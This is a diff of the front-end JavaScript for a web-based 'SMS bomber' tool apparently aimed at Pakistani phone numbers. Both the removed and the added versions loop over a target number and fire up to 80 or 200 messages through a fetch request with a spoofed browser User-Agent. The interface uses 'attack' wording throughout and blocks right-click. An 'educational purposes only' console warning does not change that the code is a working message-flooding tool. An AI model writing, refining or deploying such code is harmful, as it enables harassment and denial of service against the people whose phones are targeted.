-        abortButton.disabled = false;
-        phoneField.disabled = true;
-        quantityField.disabled = true;
-        delayField.disabled = true;
-        progressPanel.style.display = 'block';
-        clearLog();
-        updateProgressBar();
-
-        document.querySelector('.luxury-card')?.classList.add('attacking');
-        displayToast(`✦ attack initiated → ${intlNumber} ✦`, true);
-        addLogEntry(`LAUNCH — target: ${intlNumber} · total: ${amount}`, true);
-
-        for (let i = 1; i <= amount; i++) {
-            if (stopSignal || !isActive) {
-                addLogEntry(`aborted by command`, false);
-                displayToast('attack stopped', false);
-                break;
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000);
+            
+            const response = await fetch(url, {
+                method: 'GET',
+                signal: controller.signal,
+                headers: {
+                    'Accept': 'application/json',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+            });
+            
+            clearTimeout(timeoutId);
+            
+            let data;
+            const textResponse = await response.text();
+            
+            try {
+                data = JSON.parse(textResponse);
+            } catch (e) {
+                data = { status: textResponse };
             }
-
-            const outcome = await sendOne(intlNumber, i);
-            if (outcome.success) {
-                delivered++;
-                addLogEntry(`✓ msg ${i} · delivered to ${intlNumber}`, true);
-            } else {
-                addLogEntry(`✗ msg ${i} · failed`, false);
-            }
-
-            sent++;
-            updateProgressBar();
-
-            if (i < amount && delayVal > 0 && !stopSignal && isActive) {
-                await new Promise(r => { activeTimout = setTimeout(r, delayVal); });
-            }
+            
+            return { 
+                success: response.ok || textResponse.includes('success'), 
+                index: index,
+                response: data 
+            };
+        } catch (error) {
+            console.error(`Message ${index} error:`, error);
+            return { 
+                success: false, 
+                index: index, 
+                error: error.message 
+            };
         }
-
-        if (!stopSignal && isActive) {
-            if (delivered > 0) {
-                displayToast(`✦ completed · ${delivered}/${sent} messages delivered ✦`, true);
-                addLogEntry(`✦ completed — ${delivered} delivered ✦`, true);
-            } else {
-                displayToast(`⚠️ completed · 0 messages delivered`, false);
-                addLogEntry(`⚠️ zero delivery — target may be invalid`, false);
-            }
-        }
-
-        resetUI();
-        setTimeout(() => { if (!isActive) progressPanel.style.display = 'none'; }, 800);
     }
 
-    function haltAttack() {
-        if (!isActive) return;
-        stopSignal = true;
-        isActive = false;
-        if (activeTimout) clearTimeout(activeTimout);
-        addLogEntry(`ABORT — attack halted`, false);
-        displayToast('attack aborted', false);
-        resetUI();
-        progressPanel.style.display = 'none';
-        document.querySelector('.luxury-card')?.classList.remove('attacking');
+    async function startAttack() {
+        if (isAttacking) return;
+        
+        // Get and validate inputs
+        let number = phoneInput.value.trim();
+        let amount = parseInt(amountInput.value);
+        let delay = parseInt(delayInput.value);
+        
+        // Remove any '+' or spaces from number
+        number = number.replace(/[+\s]/g, '');
+        
+        if (!validateNumber(number)) return;
+        if (!validateAmount(amount)) return;
+        if (!validateDelay(delay)) return;
+        
+        // Setup attack
+        isAttacking = true;
+        sentMessages = 0;
+        totalMessages = amount;
+        
+        // Update UI
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+        phoneInput.disabled = true;
+        amountInput.disabled = true;
+        delayInput.disabled = true;
+        
+        progressSection.style.display = 'block';
+        updateProgress();
+        hideResult();
+        
+        showResult(`🚀 Initializing attack on 0${number.substring(1)}...`, 'success');
+        
+        // Add attacking class for visual effect
+        document.querySelector('.premium-card').classList.add('attacking');
+        
+        let successCount = 0;
+        let failCount = 0;
+        
+        try {
+            for (let i = 1; i <= amount; i++) {
+                if (!isAttacking) {
+                    showResult(`⏹️ Attack stopped by user. Sent: ${sentMessages}/${amount}`, 'error');
+                    break;
+                }
+                
+                const result = await sendSingleMessage(number, i);
+                
+                if (result.success) {
+                    successCount++;
+                } else {
+                    failCount++;
+                }
+                
+                sentMessages++;
+                updateProgress();
+                
+                // Show status update every 5 messages
+                if (i % 5 === 0 || i === amount) {
+                    showResult(`📡 Progress: ${sentMessages}/${amount} | Success: ${successCount} | Failed: ${failCount}`, 'success');
+                }
+                
+                // Wait for delay if not last message
+                if (i < amount && delay > 0) {
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                }
+            }
+            
+            if (isAttacking) {
+                if (successCount > 0) {
+                    showResult(`✅ ATTACK COMPLETE! ${successCount} messages successfully delivered to 0${number.substring(1)}! ${failCount > 0 ? `(${failCount} failed)` : ''}`, 'success');
+                } else {
+                    showResult(`⚠️ Attack completed but no messages were sent. The target number might be invalid or API is down.`, 'error');
+                }
+            }
+        } catch (error) {
+            console.error('Attack error:', error);
+            showResult(`❌ Critical error: ${error.message}`, 'error');
+        } finally {
+            // Cleanup
+            isAttacking = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            phoneInput.disabled = false;
+            amountInput.disabled = false;
+            delayInput.disabled = false;
+            document.querySelector('.premium-card').classList.remove('attacking');
+            
+            // Reset progress after 3 seconds
+            setTimeout(() => {
+                if (!isAttacking) {
+                    resetProgress();
+                }
+            }, 3000);
+        }
     }
 
-    // Format buttons
-    document.querySelectorAll('.format-option').forEach(btn => {
-        btn.addEventListener('click', () => {
-            const val = btn.getAttribute('data-val');
-            if (val === '92') phoneField.value = '92';
-            else if (val === '03') phoneField.value = '03';
-            else if (val === 'clear') phoneField.value = '';
-            phoneField.focus();
-        });
-    });
+    function stopAttack() {
+        if (isAttacking) {
+            isAttacking = false;
+            showResult('⏹️ Attack aborted by user command', 'error');
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            phoneInput.disabled = false;
+            amountInput.disabled = false;
+            delayInput.disabled = false;
+            document.querySelector('.premium-card').classList.remove('attacking');
+        }
+    }
 
-    phoneField.addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '');
-        if (val.startsWith('92') && val.length > 12) val = val.slice(0,12);
-        if (val.startsWith('03') && val.length > 11) val = val.slice(0,11);
-        phoneField.value = val;
+    // Event Listeners
+    startBtn.addEventListener('click', startAttack);
+    stopBtn.addEventListener('click', stopAttack);
+    
+    // Auto-format phone input (allow only digits, auto-add 03 prefix)
+    phoneInput.addEventListener('input', function(e) {
+        // Remove non-digits
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        // Auto-add 03 prefix if not present
+        if (this.value.length > 0 && !this.value.startsWith('03')) {
+            if (this.value.startsWith('92')) {
+                // If user enters 92 format, convert to 03
+                this.value = '03' + this.value.substring(2);
+            } else if (this.value.startsWith('3')) {
+                this.value = '0' + this.value;
+            } else if (!this.value.startsWith('0')) {
+                this.value = '03' + this.value;
+            }
+        }
+        
+        // Limit to 11 digits
+        if (this.value.length > 11) {
+            this.value = this.value.slice(0, 11);
+        }
     });
-
-    quantityField.addEventListener('change', () => {
-        let v = parseInt(quantityField.value);
-        if (v > 80) quantityField.value = 80;
-        if (v < 1) quantityField.value = 1;
+    
+    // Ensure amount is within limits
+    amountInput.addEventListener('change', function() {
+        let val = parseInt(this.value);
+        if (val > 200) this.value = 200;
+        if (val < 1) this.value = 1;
     });
-    delayField.addEventListener('change', () => {
-        let d = parseInt(delayField.value);
-        if (d > 2500) delayField.value = 2500;
-        if (d < 300) delayField.value = 300;
+    
+    // Ensure delay is within limits
+    delayInput.addEventListener('change', function() {
+        let val = parseInt(this.value);
+        if (val > 5000) this.value = 5000;
+        if (val < 100) this.value = 100;
     });
-
-    launchButton.addEventListener('click', beginAttack);
-    abortButton.addEventListener('click', haltAttack);
-
-    // Silent branding in console (no visible logs, just style)
-    console.log('%c✨ AHMII SMS BOMBER — Luxury Edition 2026 ✨', 'color: #D4AF37; font-size: 12px; font-weight: bold;');
+    
+    // Disable right click on page (security)
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    
+    // Console warning
+    console.log('%c⚠️ WARNING: This tool is for educational purposes only! ⚠️', 'color: #ff4757; font-size: 16px; font-weight: bold;');
+    console.log('%cUse only on numbers you own or have permission to test.', 'color: #00ff88; font-size: 14px;');
 </script>
 </body>
 </html>
